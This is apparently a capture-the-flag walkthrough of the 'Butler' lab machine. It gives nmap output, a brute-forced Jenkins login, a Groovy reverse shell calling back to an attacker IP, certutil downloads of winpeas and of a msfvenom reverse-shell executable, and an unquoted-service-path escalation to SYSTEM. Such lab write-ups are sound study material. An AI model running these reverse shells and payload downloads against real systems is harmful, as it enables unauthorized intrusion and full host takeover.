### Butler machine by TCM

IP={target_IP}

Run nmap:

 `nmap -sC -sV -p- {target_IP} -oN scan.initial` 

```jsx
Nmap scan report for {target_IP}
Host is up (0.0035s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:e2:75:a0 (Oracle VirtualBox virtual NIC)
|_clock-skew: 3s
| smb2-time: 
|   date: 2024-04-22T17:19:25
|_  start_date: N/A

```

Visiting the web:

http://{target_IP}:8080/     we found the Jenkins login form

By bruteforce it we found the credentials: `jenkins/jenkins`

And we finally logged in to Jenkins

Go to http://{target_IP}:8080/script

and for reverse shell we gonna use revsh.groovy 

https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76#file-revsh-groovy

```jsx
String host="{attacker_IP}";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Start `nc -lvnp 8044`

Execute the script in jenkins.

We get a shell.

---

Lets download winpeas.exe for privEscal.

Download and move your winpeas.exe to current folder.

Start python server

`python3 -m http.server 80` 

on the windows machine run command:

certutil.exe -urlcache -f http://{attacker_IP}:80/winpeas.exe winpeas.exe

run it `winpeas.exe`

We found out from the output of the file that `BootTime.exe has All Access and file permission Administrators [AllAccess]`  > Unquoted Service Path **vulnerability**

So, let go to our attacker machine and create reverse_tcp_shell exe: 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST={attacker_IP} LPORT=4444 -f exe -o Wise.exe`  

Move Wise.exe to our target machine:

`cd C:\Program Files (x86)\Wise` 

and execute `certutil.exe -urlcache -f http://{attacker_IP}:80/Wise.exe Wise.exe`

Let’s start our listener:

`nc -lvnp 4444`

---

Now we need to stop this service

`sc stop WiseBootAssistant`

Check that service is stopped

`sc query WiseBootAssistant`

now we can execute this service:

`sc start WiseBootAssistant`

And we got a rev shell as: 

`nt authority\system`